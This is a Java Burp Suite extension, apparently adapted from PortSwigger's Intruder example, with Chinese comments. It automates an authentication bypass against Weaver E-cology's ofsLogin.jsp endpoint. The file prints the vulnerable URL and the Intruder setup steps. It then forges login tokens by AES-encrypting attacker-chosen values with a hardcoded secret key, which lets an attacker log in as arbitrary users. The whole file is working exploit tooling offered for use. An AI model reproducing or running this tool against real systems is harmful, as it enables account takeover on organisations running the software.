package burp;


import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;
import java.io.PrintWriter;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;

//https://github.com/PortSwigger/example-intruder-payloads/blob/master/java/BurpExtender.java
//!!!要使用这个文件中的代码，需要先将文件名改为BurpExtender.java
public class BurpExtender implements IBurpExtender, IIntruderPayloadProcessor {
    private IExtensionHelpers helpers;

    //
    // implement IBurpExtender
    //

    @Override
    public void registerExtenderCallbacks(final IBurpExtenderCallbacks callbacks)
    {
        helpers = callbacks.getHelpers();
        PrintWriter stdout = new PrintWriter(callbacks.getStdout(), true);
        stdout.println("漏洞URL: http://127.0.0.1/mobile/plugin/1/ofsLogin.jsp?syscode=1&timestamp=1&gopage=/wui/index.html&receiver=用户名&loginTokenFromThird=加密字符串");
        stdout.println("syscode 和 timestamp 必须为 1");
        stdout.println("==========Intruder==========");
        stdout.println("Payload set: 2");
        stdout.println("Payload type: Copy other payload");
        stdout.println("Copy from position: 1");
        stdout.println("============================");
        stdout.println("Payload processing");
        stdout.println("Invoke Burp extension");
        callbacks.setExtensionName("Burp-E-cology-Login");
        callbacks.registerIntruderPayloadProcessor(this);
    }

    //
    // implement IIntruderPayloadProcessor
    //

    @Override
    public String getProcessorName()
    {
        return "Burp-E-cology-Login";
    }

    /**
     * 对payload的原始值进行处理，比如编码、转换等。这里就是base64编码
     * 返回的是直接可以用于替换的请求包中内容的payload
     */
    @Override
    public byte[] processPayload(byte[] currentPayload, byte[] originalPayload, byte[] baseValue)
    {
        // 解码原始值
//        String dataParameter = helpers.bytesToString(helpers.base64Decode(helpers.urlDecode(baseValue)));

        String dataParameter = helpers.bytesToString(helpers.urlDecode(baseValue));

        // 解析 input这个字符串的位置
        int start = dataParameter.indexOf("input=")+1;
        if (start == -1) {
            return currentPayload;
        }
        String prefix = dataParameter.substring(0, start);//获取前半部分
        int end = dataParameter.indexOf("&", start);
        if (end == -1) {
            end = dataParameter.length();
        }
        String suffix = dataParameter.substring(end, dataParameter.length());//获取后半部分

        // 使用payload的值，重新拼接
        dataParameter = prefix + helpers.bytesToString(currentPayload) + suffix;

        String timestamp = "1";
        String syscode = "1";
        String secretkey = "u6skkR";

        try {
            dataParameter = encrypt(dataParameter + timestamp, syscode + secretkey);
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
        return helpers.stringToBytes(helpers.urlEncode(dataParameter));//返回修改后的值
    }





    private static final String KEY_ALGORITHM = "AES";

    private static final String DEFAULT_CIPHER_ALGORITHM = "AES/ECB/PKCS5Padding";


    public static String encrypt(String string, String string2) throws Exception {
        byte[] secretKey = initSecretKey(string2);
        SecretKeySpec secretKeySpec = new SecretKeySpec(secretKey, "AES");
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(1, secretKeySpec);
        byte[] encryptedBytes = cipher.doFinal(string.getBytes());
        return byte2hex(encryptedBytes).toLowerCase();
    }

    public static String byte2hex(byte[] byteArray) {
        StringBuilder sb = new StringBuilder();
        for (byte b : byteArray) {
            String hex = Integer.toHexString(b & 0xFF);
            if (hex.length() == 1)
                sb.append('0');
            sb.append(hex);
        }
        return sb.toString().toUpperCase();
    }

    public static byte[] initSecretKey(String string) {
        try {
            KeyGenerator keyGenerator = KeyGenerator.getInstance("AES");
            SecureRandom secureRandom = SecureRandom.getInstance("SHA1PRNG");
            secureRandom.setSeed(string.getBytes());
            keyGenerator.init(128, secureRandom);
            SecretKey secretKey = keyGenerator.generateKey();
            return secretKey.getEncoded();
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
            return new byte[0];
        }
    }
}